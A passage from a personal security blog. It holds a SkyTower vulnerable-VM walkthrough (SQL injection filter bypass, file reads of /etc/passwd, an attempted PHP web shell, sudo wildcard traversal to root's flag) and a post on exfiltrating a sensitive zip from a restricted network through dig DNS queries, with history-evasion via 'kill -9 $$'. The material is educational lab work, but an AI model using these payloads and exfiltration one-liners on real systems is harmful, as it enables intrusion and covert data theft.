</pre></td><td class='code'><pre><code class='html'><span class='line'>$ curl --data &quot;email=foo@bar<span class="err">&amp;</span>password=&#39; || 1=1#&quot; http://192.168.137.242/login.php
</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
</span><span class='line'>      <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;height:100%; width:100%;background-image:url(&#39;background.jpg&#39;);</span>
</span><span class='line'><span class="s">                                background-size:100%;</span>
</span><span class='line'><span class="s">                                background-position:50% 50%;</span>
</span><span class='line'><span class="s">                                background-repeat:no-repeat;&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">        padding-right:8px;</span>
</span><span class='line'><span class="s">              padding-left:10px;</span>
</span><span class='line'><span class="s">        padding-top: 10px;</span>
</span><span class='line'><span class="s">              padding-bottom: 10px;</span>
</span><span class='line'><span class="s">                  background-color:white;</span>
</span><span class='line'><span class="s">                  border-color: #000000;</span>
</span><span class='line'><span class="s">                  border-width: 5px;</span>
</span><span class='line'><span class="s">                  border-style: solid;</span>
</span><span class='line'><span class="s">                  width: 400px;</span>
</span><span class='line'><span class="s">                  height:430px;</span>
</span><span class='line'><span class="s">                  position:absolute;</span>
</span><span class='line'><span class="s">                  top:50%;</span>
</span><span class='line'><span class="s">                  left:50%;</span>
</span><span class='line'><span class="s">                  margin-top:-215px; /* this is half the height of your div*/</span>
</span><span class='line'><span class="s">                  margin-left:-200px;</span>
</span><span class='line'><span class="s">                                &quot;</span><span class="nt">&gt;</span>
</span><span class='line'>   <span class="nt">&lt;br&gt;&lt;strong&gt;&lt;font</span> <span class="na">size=</span><span class="s">4</span><span class="nt">&gt;</span>Welcome john@skytech.com<span class="nt">&lt;/font&gt;&lt;br</span> <span class="nt">/&gt;</span> <span class="nt">&lt;/br&gt;&lt;/strong&gt;</span>As you may know, SkyTech has ceased all international operations.<span class="nt">&lt;br&gt;&lt;br&gt;</span> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<span class="nt">&lt;br&gt;&lt;br&gt;&lt;strong&gt;</span>Unfortunately, all international contracts, including yours have been terminated.<span class="nt">&lt;/strong&gt;&lt;br&gt;&lt;br&gt;</span> The remainder of your contract and retirement fund, <span class="nt">&lt;strong&gt;</span>$2<span class="nt">&lt;/strong&gt;</span> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<span class="nt">&lt;br&gt;&lt;br&gt;&lt;strong&gt;</span>Username: john<span class="nt">&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;</span>Password: hereisjohn<span class="nt">&lt;/strong&gt;</span> <span class="nt">&lt;br&gt;&lt;br&gt;</span> We wish you the best of luck in your future endeavors. <span class="nt">&lt;br&gt;</span> <span class="nt">&lt;/div&gt;</span> <span class="nt">&lt;/div&gt;&lt;/HTML&gt;</span>%
</span></code></pre></td></tr></table></div></figure>


<p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>

<h2>climbing the tower and faling hard</h2>

<p>From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username <code>john</code> and a password <code>hereisjohn</code>. So lets try this.
I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>

<figure class='code'><figcaption><span>SSH via Squid Proxy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>proxychains4 ssh john@127.0.0.1
</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
</span><span class='line'><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
</span><span class='line'>john@127.0.0.1<span class="err">&#39;</span>s password:
</span><span class='line'>Linux SkyTower 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.54-2 x86_64</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Thu Jul 17 12:54:32 2014 from localhost
</span><span class='line'>
</span><span class='line'>Funds have been withdrawn
</span><span class='line'>Connection to 127.0.0.1 closed.
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>

<h2>more sql injection</h2>

<p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>

<figure class='code'><figcaption><span>SkyTower = filter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; || id=1#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'>There was an error running the query <span class="o">[</span>Unknown column <span class="s1">&#39;id1&#39;</span> in <span class="s1">&#39;where clause&#39;</span><span class="o">]</span>%
</span></code></pre></td></tr></table></div></figure>


<p>Well I definitely didn&rsquo;t ask for the column <code>id1</code>, but from this again it was apparent that <code>=</code> was filtered along with <code>OR</code>. :| Ok, so we change the payload again:</p>

<figure class='code'><figcaption><span>SkyTower user enum</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; || id &gt; 1#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
</span><span class='line'>&lt;br&gt;&lt;strong&gt;&lt;font <span class="nv">size</span><span class="o">=</span>4&gt;Welcome sara@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span class="k">for </span>your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;<span class="nv">$2</span>&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: sara&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: ihatethisjob&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;%
</span></code></pre></td></tr></table></div></figure>


<p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>

<ul>
<li>john:hereisjohn</li>
<li>sara:ihatethisjob</li>
<li>william:senseable</li>
</ul>


<p>The users <code>john</code> &amp; <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>

<h2>more SQL enumeration</h2>

<p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>

<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> &amp; <code>--risk 3</code> there was no joy. This is ok.</p>

<p>I studied the error messages in detail, googled&hellip; a lot&hellip; and eventually came across <a href="http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html">this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>

<p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>

<figure class='code'><figcaption><span>SkyTower File Access</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&#39;/etc/password&#39;)) as c#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
</span><span class='line'>&lt;br&gt;&lt;strong&gt;&lt;font <span class="nv">size</span><span class="o">=</span>4&gt;Welcome 222&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span class="k">for </span>your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;<span class="nv">$2</span>&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: 222&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>john:x:1000:1000:john,,,:/home/john:/bin/bash
</span><span class='line'>sara:x:1001:1001:,,,:/home/sara:/bin/bash
</span><span class='line'>william:x:1002:1002:,,,:/home/william:/bin/bash
</span><span class='line'>&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Reading the <code>/etc/passwd</code> revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of <code>login.php</code> in order to understand what the deal with the filtering was:</p>

<figure class='code'><figcaption><span>SkyTower SQL Injection Filtering</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$sqlinjection</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;SELECT&quot;</span><span class="p">,</span> <span class="s2">&quot;TRUE&quot;</span><span class="p">,</span> <span class="s2">&quot;FALSE&quot;</span><span class="p">,</span> <span class="s2">&quot;--&quot;</span><span class="p">,</span><span class="s2">&quot;OR&quot;</span><span class="p">,</span> <span class="s2">&quot;=&quot;</span><span class="p">,</span> <span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="s2">&quot;AND&quot;</span><span class="p">,</span> <span class="s2">&quot;NOT&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$email</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$sqlinjection</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$sqlinjection</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And as suspected. :)</p>

<p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>

<figure class='code'><figcaption><span>SkyTower webshell fail</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt &#39;&lt;?php print_r(shell_exec($_GET[cmd])); ?&gt;&#39;) as c into outfile &#39;/var/www/shell.php&#39;#&quot;</span> http://192.168.137.242/login.php
</span><span class='line'>There was an error running the query <span class="o">[</span>Can<span class="s1">&#39;t create/write to file &#39;</span>/var/www/shell.php<span class="err">&#39;</span> <span class="o">(</span>Errcode: 13<span class="o">)]</span>
</span></code></pre></td></tr></table></div></figure>


<p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&hellip;
Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t expect it to be <em>that</em> easy :D</p>

<h2>gaining further access</h2>

<p>After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&rsquo;t <em>appear</em> to be any custom shells in use, so the other thing this could be is a <code>.bashrc</code> with a <code>exit</code> command. I know its <code>.bashrc</code> because I saw the shell is <code>/bin/bash</code> from the <code>/etc/passwd</code>. I remember that I make heavy use of <code>ssh -t</code> to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.</p>

<p>For this case though, I though I&rsquo;d specify a <code>/bin/sh</code> as the <em>command</em> to run, hoping to not get caught in a <code>.bashrc</code> running:</p>

<figure class='code'><figcaption><span>SkyTower .bashrc fix</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
</span><span class='line'>john@127.0.0.1<span class="err">&#39;</span>s password:
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>

<figure class='code'><figcaption><span>SkyTower .bashrc exit</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span>
</span><span class='line'><span class="nb">echo</span>  <span class="s2">&quot;Funds have been withdrawn&quot;</span>
</span><span class='line'><span class="nb">exit</span>
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>

<h2>enumeration enumeration enumeration</h2>

<p>I enumerated, everything&hellip; Referring to a excellent <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>

<figure class='code'><figcaption><span>SkyTower accounts</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:/accounts<span class="nv">$ </span>ls -lah /accounts/
</span><span class='line'>total 8.0K
</span><span class='line'>drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
</span><span class='line'>drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
</span></code></pre></td></tr></table></div></figure>


<p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&hellip;</p>

<figure class='code'><figcaption><span>sara sudo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sara@SkyTower:~<span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for </span>sara on this host:
</span><span class='line'>    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User sara may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/cat /accounts/*, <span class="o">(</span>root<span class="o">)</span> /bin/ls /accounts/*
</span></code></pre></td></tr></table></div></figure>


<p>This user may execute some commands as root using <code>sudo</code>. <code>sudo</code> allows you to specify what those commands are, if not all. There was one problem with this configuration though. <code>*</code> is a wildcard character, and as such, anything after <code>cat /accounts/</code> may also be run. This means that things like <code>sudo cat /accounts/../../etc/shadow</code> will work as the wildcard allows us to do a form of directory traversal.</p>

<h2>pwnd</h2>

<p>So, to complete SkyTower:</p>

<figure class='code'><figcaption><span>SkyTower pwn</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sara@SkyTower:~<span class="nv">$ </span>sudo cat /accounts/../../root/flag.txt
</span><span class='line'>Congratz, have a cold one to celebrate!
</span><span class='line'>root password is theskytower
</span></code></pre></td></tr></table></div></figure>


<p>Thanks to <a href="https://twitter.com/telspacesystems">@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsfilexfer - yet another take on file transfer via DNS]]></title>
    <link href="http://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/"/>
    <updated>2014-03-11T06:10:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns</id>
    <content type="html"><![CDATA[<p>This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.</p>

<h3>this article is not&hellip;</h3>

<p>&hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.</p>

<!--more-->


<h2>the idea</h2>

<p>At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged &amp; formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.</p>

<p>Consider the following scenario.</p>

<p>You have access to a very <em>secure</em> network. <em>Secure</em> in the sense that the firewalls are configured to allow <strong>NO</strong> outbound tcp connectivity. In fact, UDP is also limited to only allow DNS queries as a primary DNS server lives outside of this <em>secure</em> network, and provides most of the networks for this company with DNS services. Lets not dabble in the fact that the network can not receive any software updates etc, and just focus on the fact that it is a highly restricted network and contains potentially sensitive data.</p>

<p>You on the other hand, are responsible to come into the data centre where this network resides physically, and have some configuration changes to make, which involves you logging onto the console of a said server. While logged in, you notice a file, <code>z300_technical_diagrams.zip</code>. Looks pretty juicy! But, the file is close to 20MB, and the flash disk you have with you will be handed back to its owner before you leave the premises. You are also very aware of the security posture of this network and know that the only connectivity that is allowed outbound is udp/53.</p>

<p>Luckily for you, you have a DNS file transfer server setup at home. You choose to use that as you would like to be sure that incase there may be some form of IPS on the border, your traffic wont be filtered. Your traffic will look like legit, semi &lsquo;non-suspect&rsquo; DNS lookup requests.</p>

<h2>the setup</h2>

<p>So, to get the file <code>z300_technical_diagrams.zip</code> out of this network, we need to create DNS lookups of parts of this file, specifying the name server to use. We test that lookups work with a quick dig to our name server at home. (server ip swapped to 127.0.0.1)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% dig A 123456.fake.com @127.0.0.1
</span><span class='line'>
</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 123456.fake.com @127.0.0.1
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; Got answer:
</span><span class='line'>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24059
</span><span class='line'>;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
</span><span class='line'>
</span><span class='line'>;; QUESTION SECTION:
</span><span class='line'>;123456.fake.com.    IN A
</span><span class='line'>
</span><span class='line'>;; ANSWER SECTION:
</span><span class='line'>123456.fake.com.  60 IN A  127.0.0.1
</span><span class='line'>
</span><span class='line'>;; Query time: 0 msec
</span><span class='line'>;; SERVER: 127.0.0.1#53(127.0.0.1)
</span><span class='line'>;; WHEN: Tue Mar 11 07:55:31 2014
</span><span class='line'>;; MSG SIZE  rcvd: 49</span></code></pre></td></tr></table></div></figure>


<p>Great, so it seems like we have working comms to our own name server, as we got a answer of 127.0.0.1. Our server will always respond with 127.0.0.1 being the IP.</p>

<h2>preparing the file</h2>

<p>With comms working to our name server, we can get some information about the file and test if a hex dump tool like <code>xxd</code> is available. This will enable us to break the file up in to little parts that can be used as DNS questions.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% ls -lah z300_technical_diagrams.zip
</span><span class='line'>-rw-r--r--  1 bob  staff   20.1M Jan 27 01:01 z300_technical_diagrams.zip
</span><span class='line'>% xxd -p z300_technical_diagrams.zip
</span><span class='line'>504b03040a000000000042a9384400000000000000000000000017001c00
</span><span class='line'>7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
</span><span class='line'>e3523947e35275780b000104f50100000414000000504b03040a00000000
</span><span class='line'>0049a938440000000000000000000000001b001c007068616e746f6d6a73
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Great. It looks like we have everything we need to make this work. :)</p>

<h2>&lsquo;transferring&rsquo; the file</h2>

<p>Now, we will use a simple awk, and prepare a few dig queries to our name server and finally, run the actual lookups. The best way to explain what is happening here is to actually show it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% xxd -p z300_technical_diagrams.zip | awk '{ print "dig " $1 ".fake.io @127.0.0.1 +short" }'
</span><span class='line'>dig 2e965f1608019c826a5b89b9a881b6df63a634a3ca83c01aa349411e4fa0.fake.io @127.0.0.1 +short
</span><span class='line'>dig 37aec06d77acd4d16ca559e008078e8bbfa2e1f0e3db8b995885fe398d48.fake.io @127.0.0.1 +short
</span><span class='line'>dig 763b55cfda9b977328588068d3a9b63b06811f5ecfae570e3f6e2d8b5e34.fake.io @127.0.0.1 +short
</span><span class='line'>dig 97b223da3800b1341ced3cc9e8542f53c0e123965e24591a9b75f58d4330.fake.io @127.0.0.1 +short
</span><span class='line'>dig eb9287c294832c7a79a84dc1cd066baf7e51adabc070eab8477a7cc4530d.fake.io @127.0.0.1 +short
</span><span class='line'>dig 9110217bcafcbaa48eee91567bfd698a76c70961ca9fea3402f929d4ee87.fake.io @127.0.0.1 +short
</span><span class='line'>dig f543e9a8c27602aeb2f6744a5097a7f20404f3e53d513c11d63e70434a71.fake.io @127.0.0.1 +short
</span><span class='line'>dig 61e85f16195f2fa75a82368cfbc781ace543ab22fcb72c97fbdb03015f8c.fake.io @127.0.0.1 +short
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>As you can see, the output has generated a whole bunch of potential lookups for random strings. The same command above is rerun, but with <code>| sh</code> at the end, performing the actual lookups.
On our server, we have tcpdump listening on port 53, writing all of the recorded packets to a file.</p>

<h2>back home</h2>

<p>We close our bash session with <code>kill -9 $$</code> to prevent any history from writing and relogin, completing the original work we came for.</p>

<p>Back home, it was time to stop the <code>tcpdump</code> that was running, and attempt to reassemble that file. The domain we used for the lookups was <code>fake.io</code>, so we just grep the output for that to ensure that we got the relevant parts (real ip&rsquo;s masked to 127.0.0.1):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io
</span><span class='line'>reading from file raw, link-type NULL (BSD loopback)
